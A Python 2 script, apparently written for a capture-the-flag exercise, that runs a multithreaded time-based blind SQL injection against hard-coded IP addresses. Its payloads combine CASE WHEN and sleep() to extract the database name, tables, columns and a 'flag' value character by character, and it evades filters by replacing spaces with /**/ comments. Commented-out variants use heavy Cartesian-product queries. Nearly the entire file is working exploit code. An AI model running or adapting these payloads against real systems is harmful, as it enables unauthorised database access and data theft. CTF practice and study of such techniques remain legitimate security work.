#/bin/python
# -*- coding:utf-8 -*-

import requests
import datetime
import threading
import time

# 笛卡尔积
# url = "http://144.34.200.224:8082/index.php?id=1\' and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23"  

# SELECT CASE WHEN 1=1 THEN true ELSE false END 绕过  if
url = "http://202.197.58.168:8082/index.php?id=1 and %s"
# url = "http://144.34.200.224:8082/index.php?id=1 and %s"

starttime = datetime.datetime.now()

data= {}

def main():
    flag=''
    for i in range(1,50):
        for j in range(33,127):
            # payload = '(select case when ascii(substring((select database() limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)
            # payload = '(select case when ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s then sleep(5) else 0 end)' %(i,j) 
            # payload = "(select case when ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x4e6f74696365),%s,1))=%s then sleep(5) else 0 end)" % (i, j) #flag
            payload ='(select case when ascii(substr((select flag from Notice limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)

            # 笛卡尔积
            # payload = '(ascii(substr((select database() limit 1),%s,1))=%s)' %(i,j)
            # payload = '(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)' %(i,j) 
            # payload = "(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='notice'),%s,1))=%s)" % (i, j) #flag
            # payload ='(ascii(substr((select flag from Notice limit 1),%s,1))=%s)' %(i,j)
            payload_url =url%(payload)
            payload_url =  payload_url.replace(' ','/**/')
            # print (payload_url)
            try:
                r = requests.get(payload_url,timeout=5)
            except:
                flag+=chr(j)
                print flag
                break
    print 'flag:'+flag
    endtime = datetime.datetime.now()
    print (endtime - starttime).seconds

def check(i):
    for j in range(33,127):
        # payload = '(select case when ascii(substr((select database() limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)
        # payload = '(select case when ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s then sleep(5) else 0 end)' %(i,j) 
        # payload = "(select case when ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x4e6f74696365),%s,1))=%s then sleep(5) else 0 end)" % (i, j) #flag
        payload ='(select case when ascii(substr((select flag from Notice limit 1),%s,1))=%s then sleep(5) else 0 end)' %(i,j)
        payload_url =url%(payload)
        payload_url =  payload_url.replace(' ','/**/')
        print (payload_url)
        try:
            r = requests.get(payload_url,timeout=3)
            time.sleep(0.015)
        except:
            data.setdefault(i)
            data[i]=chr(j)
            print data
            break

def run():
    threads = []
    for i in range(1,50):
        t = threading.Thread(target=check,args=(i,))
        threads.append(t)
    for t in threads:
        time.sleep(2)
        t.start()
    for t in threads:
        t.join()

def got():
    run()
    flag =''
    for i in data:
        flag+= (data[i])
    print 'flag:'+flag
    endtime = datetime.datetime.now()
    print 'using time:'+str((endtime - starttime).seconds)

if __name__ == "__main__":
    # 单线程
    # main()

    # 多线程
    got()

# swapoff -a && swapon -a